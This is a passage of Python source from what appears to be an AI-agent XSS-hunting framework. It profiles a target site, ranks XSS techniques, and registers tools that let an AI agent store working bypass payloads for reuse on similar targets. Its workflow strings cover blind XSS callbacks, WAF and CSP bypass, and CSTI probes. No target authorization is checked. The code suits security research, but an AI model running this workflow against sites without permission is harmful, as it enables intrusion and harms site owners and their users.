            profile["has_redirect_params"] = bool(redirect_params & all_param_names)

            # Server info
            profile["server"] = fp.get("server", "unknown")
            profile["powered_by"] = fp.get("powered_by", "unknown")

            # Check for file upload forms
            profile["has_file_upload"] = any(
                any(inp.get("type") == "file" for inp in f.get("inputs", []))
                for f in forms
            )

            # Check for persistent/stored fields
            persistent_indicators = {"comment", "message", "bio", "description", "note",
                                     "review", "feedback", "name", "display", "title",
                                     "subject", "body", "text", "content"}
            all_input_names = set()
            for f in forms:
                for inp in f.get("inputs", []):
                    all_input_names.add(inp.get("name", "").lower())
            profile["has_persistent_fields"] = bool(persistent_indicators & all_input_names)

            # Check for feedback/contact forms
            feedback_indicators = {"contact", "feedback", "report", "support", "help", "ticket", "abuse"}
            form_actions = {f.get("action", "").lower() for f in forms}
            profile["has_feedback_forms"] = any(
                any(ind in action for ind in feedback_indicators) for action in form_actions
            ) or bool(feedback_indicators & all_input_names)

        # --- From spider data ---
        if spider_data:
            endpoints = spider_data.get("endpoints", [])
            spider_forms = spider_data.get("forms", [])
            tech_stack = spider_data.get("tech_stack", [])

            # Framework detection
            tech_lower = [str(t).lower() for t in tech_stack]
            profile["has_framework"] = any(fw in " ".join(tech_lower) for fw in
                                           ["react", "vue", "angular", "next", "nuxt", "svelte"])
            profile["has_template_engine"] = any(t in " ".join(tech_lower) for t in
                                                 ["angular", "vue", "handlebars", "mustache", "ejs", "jinja", "nunjucks"])
            profile["has_spa_routing"] = profile.get("has_framework", False)

            # JavaScript analysis signals
            profile["has_javascript"] = True  # nearly all modern sites
            profile["has_complex_js"] = len(endpoints) > 10

            # Merge forms from spider if recon found none
            if not profile.get("has_forms") and spider_forms:
                profile["has_forms"] = True
                # Re-check persistent fields from spider forms
                for f in spider_forms:
                    for inp in f.get("inputs", []):
                        name = inp.get("name", "").lower()
                        if name in persistent_indicators:
                            profile["has_persistent_fields"] = True

            # JSONP detection
            profile["has_jsonp"] = any(
                "callback" in str(ep.get("params", {})).lower() or
                "jsonp" in str(ep.get("url", "")).lower()
                for ep in endpoints
            )

            # Merge file upload detection from spider
            if not profile.get("has_file_upload"):
                profile["has_file_upload"] = any(
                    any(inp.get("type") == "file" for inp in f.get("inputs", []))
                    for f in spider_forms
                )

        # Defaults for missing signals
        profile.setdefault("has_forms", False)
        profile.setdefault("has_query_params", False)
        profile.setdefault("has_javascript", True)
        profile.setdefault("has_framework", False)
        profile.setdefault("has_template_engine", False)
        profile.setdefault("has_csp", False)
        profile.setdefault("has_waf", False)
        profile.setdefault("has_persistent_fields", False)
        profile.setdefault("has_feedback_forms", False)
        profile.setdefault("has_file_upload", False)
        profile.setdefault("has_jsonp", False)
        profile.setdefault("has_redirect_params", False)
        profile.setdefault("has_spa_routing", False)

        # Signals that require runtime detection (set during exploitation)
        profile.setdefault("reflects_input", True)  # optimistic — most targets reflect something
        profile.setdefault("has_filter", False)
        profile.setdefault("has_sanitizer", False)
        profile.setdefault("uses_location_hash", False)
        profile.setdefault("has_postmessage_handler", False)
        profile.setdefault("uses_window_name", False)
        profile.setdefault("uses_web_storage", False)
        profile.setdefault("has_eval_sink", False)
        profile.setdefault("has_deep_merge", False)
        profile.setdefault("has_prototype_pollution", False)
        profile.setdefault("has_css_injection", False)
        profile.setdefault("has_cache", False)
        profile.setdefault("input_in_headers", False)
        profile.setdefault("has_secondary_display", False)
        profile.setdefault("has_markdown_editor", False)
        profile.setdefault("accepts_svg", False)
        profile.setdefault("has_stored_xss", False)
        profile.setdefault("blind_submitted", False)
        profile.setdefault("blind_confirmed", False)
        profile.setdefault("blind_callback_received", False)
        profile.setdefault("content_type_mismatch", False)

        return profile

    def _score_skill(self, skill: Dict[str, Any], profile: Dict[str, Any]) -> float:
        """
        Score a skill's relevance to the target profile.
        Returns 0.0 - 1.0 score. Higher = more applicable.
        """
        conditions = skill.get("applicable_when", {})
        if not conditions:
            return 0.3  # generic skill, always somewhat relevant

        matches = 0
        total = len(conditions)

        for key, expected_val in conditions.items():
            actual_val = profile.get(key)
            if actual_val is None:
                continue

            if isinstance(expected_val, bool):
                if actual_val == expected_val:
                    matches += 1
            elif isinstance(expected_val, str):
                if str(actual_val).lower() == expected_val.lower():
                    matches += 1
            else:
                if actual_val == expected_val:
                    matches += 1

        if total == 0:
            return 0.3

        base_score = matches / total

        # Level bonus: beginner skills are always applicable
        level = skill.get("level", "beginner")
        level_bonus = {"beginner": 0.15, "intermediate": 0.05, "advanced": 0.0}
        base_score += level_bonus.get(level, 0.0)

        # Type bonus: reflected/dom are always worth trying
        xss_type = skill.get("xss_type", "")
        if xss_type in ("reflected", "dom") and base_score < 0.3:
            base_score = max(base_score, 0.3)

        return min(1.0, base_score)

    def analyse(
        self,
        recon_data: Optional[Dict] = None,
        spider_data: Optional[Dict] = None,
        runtime_signals: Optional[Dict] = None,
    ) -> Dict[str, Any]:
        """
        Analyse target and return ranked applicable techniques.

        Args:
            recon_data: Output from run_recon tool
            spider_data: Output from run_spider tool
            runtime_signals: Additional signals discovered during exploitation

        Returns:
            Dict with target_profile, ranked techniques, and recommended workflow
        """
        profile = self._build_target_profile(
            recon_data or {},
            spider_data or {},
        )

        # Merge runtime signals (e.g., filter detected, sanitizer found)
        if runtime_signals:
            profile.update(runtime_signals)

        # Load dynamic/learned skills
        all_skills = list(self.skills)
        if self._dynamic_store:
            all_skills.extend(self._dynamic_store.get_skills())

        # Score and rank
        scored = []
        for skill in all_skills:
            score = self._score_skill(skill, profile)
            if score > 0.0:
                scored.append({
                    **skill,
                    "relevance_score": round(score, 2),
                })

        scored.sort(key=lambda s: (-s["relevance_score"], s.get("level", "beginner")))

        # Group by type for the AI
        by_type: Dict[str, List] = {}
        for s in scored:
            t = s.get("xss_type", "unknown")
            by_type.setdefault(t, []).append(s)

        # Build recommended workflow based on profile
        workflow = self._build_workflow(profile, scored)

        return {
            "target_profile": profile,
            "total_applicable_techniques": len(scored),
            "techniques_by_type": {
                t: {
                    "count": len(techs),
                    "techniques": techs,
                }
                for t, techs in by_type.items()
            },
            "recommended_workflow": workflow,
            "top_5_techniques": scored[:5],
        }

    def _build_workflow(self, profile: Dict, scored: List[Dict]) -> List[str]:
        """Build a recommended testing workflow based on target profile."""
        workflow = []

        # Always start with reflected
        workflow.append("1. Test all query parameters and form fields for reflected XSS (marker test first, then context-aware payloads)")

        if profile.get("has_persistent_fields"):
            workflow.append("2. Test stored XSS in all persistent fields (profile, comments, messages)")

        if profile.get("has_javascript"):
            workflow.append("3. Analyse JavaScript for DOM XSS sources and sinks (location.hash, postMessage, innerHTML)")

        if profile.get("has_feedback_forms"):
            workflow.append("4. Submit blind XSS callback payloads to feedback/support/contact forms")

        if profile.get("has_template_engine"):
            workflow.append("5. Test for CSTI with {{7*7}} in reflected/stored contexts")

        if profile.get("has_file_upload"):
            workflow.append("6. Test file upload: SVG with script, filename XSS")

        if profile.get("has_csp"):
            workflow.append("7. Analyse CSP for bypass routes (whitelisted domains, unsafe-inline, upload endpoints)")

        if profile.get("has_waf"):
            workflow.append("8. Apply WAF bypass techniques: encoding rotation, uncommon tags, null bytes")

        if profile.get("has_redirect_params"):
            workflow.append("9. Test OAuth/SSO redirect parameters for XSS (not just open redirect)")

        if not workflow:
            workflow = [
                "1. Run marker test on all inputs to confirm reflection",
                "2. Test reflected XSS with context-aware payloads",
                "3. Check for DOM-based sources/sinks in JavaScript",
                "4. Test stored XSS if persistent fields exist",
            ]

        return workflow


# ═══════════════════════════════════════════════════════════════════
# DYNAMIC SKILL STORE — learns and persists novel techniques
# ═══════════════════════════════════════════════════════════════════

class DynamicSkillStore:
    """
    Manages learned/discovered XSS skills.
    Persists to evidence/learned_skills.json.
    When the AI discovers a novel bypass pattern that doesn't match
    existing techniques, it creates a new skill entry here.
    """

    def __init__(self, evidence_dir: Optional[str] = None):
        if evidence_dir is None:
            # Default: evidence/ in project root
            evidence_dir = os.path.join(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                "evidence",
            )
        self.evidence_dir = evidence_dir
        self.skills_file = os.path.join(evidence_dir, "learned_skills.json")
        self._skills: List[Dict[str, Any]] = []
        self._load()

    def _load(self) -> None:
        """Load skills from disk."""
        if os.path.isfile(self.skills_file):
            try:
                with open(self.skills_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                self._skills = data.get("skills", [])
                logger.info("Loaded %d learned skills from %s", len(self._skills), self.skills_file)
            except (json.JSONDecodeError, OSError) as e:
                logger.warning("Failed to load learned skills: %s", e)
                self._skills = []
        else:
            self._skills = []

    def _save(self) -> None:
        """Persist skills to disk."""
        os.makedirs(self.evidence_dir, exist_ok=True)
        data = {
            "version": "1.0",
            "last_updated": datetime.now().isoformat(),
            "total_skills": len(self._skills),
            "skills": self._skills,
        }
        try:
            with open(self.skills_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, default=str)
            logger.info("Saved %d learned skills to %s", len(self._skills), self.skills_file)
        except OSError as e:
            logger.error("Failed to save learned skills: %s", e)

    def get_skills(self) -> List[Dict[str, Any]]:
        """Return all learned skills in XSS_SKILL_DB format."""
        return list(self._skills)

    def add_skill(
        self,
        name: str,
        xss_type: str,
        target_fingerprint: Dict[str, Any],
        technique_description: str,
        working_payload: str,
        context: str,
        applicable_when: Optional[Dict[str, Any]] = None,
        bypass_mechanism: str = "",
        notes: str = "",
    ) -> Dict[str, Any]:
        """
        Add a newly discovered skill.

        Returns the created skill entry.
        """
        skill_id = f"learned_{len(self._skills) + 1:04d}"

        # Check for duplicates (same payload on same type)
        for existing in self._skills:
            if (existing.get("working_payload") == working_payload and
                    existing.get("xss_type") == xss_type):
                return {
                    "status": "duplicate",
                    "existing_id": existing.get("id"),
                    "message": "A skill with this exact payload and type already exists",
                }

        skill = {
            "id": skill_id,
            "name": name,
            "xss_type": xss_type,
            "level": "advanced",  # learned skills are inherently advanced
            "discovered_on": datetime.now().isoformat(),
            "target_fingerprint": target_fingerprint,
            "detection_signals": [
                f"Similar target fingerprint: {json.dumps(target_fingerprint)}",
            ],
            "applicable_when": applicable_when or {},
            "technique_steps": [technique_description],
            "working_payload": working_payload,
            "recommended_payloads": [],
            "verification": f"Working payload: {working_payload}",
            "bypass_mechanism": bypass_mechanism,
            "notes": notes,
            "source": "dynamic_learning",
        }

        self._skills.append(skill)
        self._save()

        logger.info("Learned new skill: %s (%s) — %s", name, skill_id, xss_type)
        return {
            "status": "created",
            "skill_id": skill_id,
            "skill": skill,
        }

    def search(self, query: str) -> List[Dict[str, Any]]:
        """Search learned skills by keyword."""
        query_lower = query.lower()
        results = []
        for skill in self._skills:
            searchable = json.dumps(skill).lower()
            if query_lower in searchable:
                results.append(skill)
        return results


# ═══════════════════════════════════════════════════════════════════
# SINGLETON INSTANCES
# ═══════════════════════════════════════════════════════════════════

_skill_matcher = SkillMatcher()
_dynamic_store = DynamicSkillStore()
_skill_matcher.set_dynamic_store(_dynamic_store)


# ═══════════════════════════════════════════════════════════════════
# TOOL EXECUTORS
# ═══════════════════════════════════════════════════════════════════

def execute_analyse_target_skills(args: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
    """
    Tool executor: Analyse the target and return ranked applicable XSS techniques.

    Should be called after recon and spider to get an intelligent hunting strategy.
    """
    recon_data = args.get("recon_data") or context.get("recon_data")
    spider_data = args.get("spider_data") or context.get("spider_data")
    runtime_signals = args.get("runtime_signals", {})

    result = _skill_matcher.analyse(
        recon_data=recon_data,
        spider_data=spider_data,
        runtime_signals=runtime_signals,
    )

    return result


def execute_learn_new_skill(args: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
    """
    Tool executor: Learn and persist a novel XSS technique discovered during testing.

    Called when the AI discovers a bypass pattern that doesn't match existing skills.
    """
    name = args.get("name", "")
    xss_type = args.get("xss_type", "reflected")
    target_fingerprint = args.get("target_fingerprint", {})
    technique_description = args.get("technique_description", "")
    working_payload = args.get("working_payload", "")
    skill_context = args.get("context", "unknown")
    bypass_mechanism = args.get("bypass_mechanism", "")
    applicable_when = args.get("applicable_when", {})
    notes = args.get("notes", "")

    if not name or not working_payload:
        return {"error": "Missing required fields: name, working_payload"}

    # Get target fingerprint from context if not provided
    if not target_fingerprint and context.get("recon_data"):
        fp = context["recon_data"].get("fingerprint", {})
        target_fingerprint = {
            "server": fp.get("server", "unknown"),
            "powered_by": fp.get("powered_by", "unknown"),
            "security_posture": fp.get("security_posture", "unknown"),
        }

    result = _dynamic_store.add_skill(
        name=name,
        xss_type=xss_type,
        target_fingerprint=target_fingerprint,
        technique_description=technique_description,
        working_payload=working_payload,
        context=skill_context,
        applicable_when=applicable_when,
        bypass_mechanism=bypass_mechanism,
        notes=notes,
    )

    return result


# ═══════════════════════════════════════════════════════════════════
# TOOL REGISTRATION
# ═══════════════════════════════════════════════════════════════════

_ANALYSE_SKILLS_TOOL = ToolSpec(
    name="analyse_target_skills",
    description=(
        "Analyse the target based on recon and spider results, then return a ranked list "
        "of applicable XSS hunting techniques. Covers all 5 XSS types: Reflected, Stored, "
        "DOM-based, Blind, and CSTI/Mutation. Each technique includes detection signals, "
        "step-by-step instructions, and recommended payloads. Call this AFTER run_recon and "
        "run_spider to get an intelligent, prioritized hunting strategy for the target. "
        "You can also pass runtime_signals to refine the analysis (e.g., after discovering "
        "a WAF, sanitizer, or specific filter behavior during testing)."
    ),
    parameters={
        "type": "object",
        "properties": {
            "recon_data": {
                "type": "object",
                "description": "Optional: explicit recon data. If omitted, uses data from context (previous run_recon call).",
            },
            "spider_data": {
                "type": "object",
                "description": "Optional: explicit spider data. If omitted, uses data from context (previous run_spider call).",
            },
            "runtime_signals": {
                "type": "object",
                "description": (
                    "Optional: additional signals discovered during testing. Keys include: "
                    "has_filter (bool), has_waf (bool), has_sanitizer (bool), has_template_engine (bool), "
                    "uses_location_hash (bool), has_postmessage_handler (bool), reflects_input (bool), "
                    "has_cache (bool), content_type_mismatch (bool), etc."
                ),
            },
        },
        "required": [],
    },
    executor=execute_analyse_target_skills,
)

_LEARN_SKILL_TOOL = ToolSpec(
    name="learn_new_skill",
    description=(
        "Learn and persist a novel XSS bypass technique discovered during testing. "
        "Use this when you discover a new bypass pattern, filter evasion, or exploitation "
        "technique that is NOT already covered by the built-in skill database. The learned "
        "skill is saved to disk and will be available in future scans against similar targets. "
        "Provide the technique name, type, working payload, bypass mechanism, and target fingerprint."
    ),
    parameters={
        "type": "object",
        "properties": {
            "name": {
                "type": "string",
                "description": "Descriptive name for the technique (e.g., 'Nginx double-decode bypass on search param').",
            },
            "xss_type": {
                "type": "string",
                "description": "XSS type: reflected, stored, dom, blind, or csti_mutation.",
                "enum": ["reflected", "stored", "dom", "blind", "csti_mutation"],
            },
            "working_payload": {
                "type": "string",
                "description": "The exact payload that worked.",
            },
            "technique_description": {
                "type": "string",
                "description": "Step-by-step description of how this technique works and why it bypasses defenses.",
            },
            "bypass_mechanism": {
                "type": "string",
                "description": "Brief explanation of what defense was bypassed and how.",
            },
            "context": {
                "type": "string",
                "description": "The reflection/execution context (e.g., html_body, attribute_value, javascript_string).",
            },
            "target_fingerprint": {
                "type": "object",
                "description": "Optional: server/framework/WAF fingerprint of the target where this was discovered.",
            },
            "applicable_when": {
                "type": "object",
                "description": "Optional: conditions dict for when this technique is applicable on other targets.",
            },
            "notes": {
                "type": "string",
                "description": "Optional: additional notes, caveats, or context about this technique.",
            },
        },
        "required": ["name", "xss_type", "working_payload", "technique_description"],
    },
    executor=execute_learn_new_skill,
)

register_tool(_ANALYSE_SKILLS_TOOL)
register_tool(_LEARN_SKILL_TOOL)
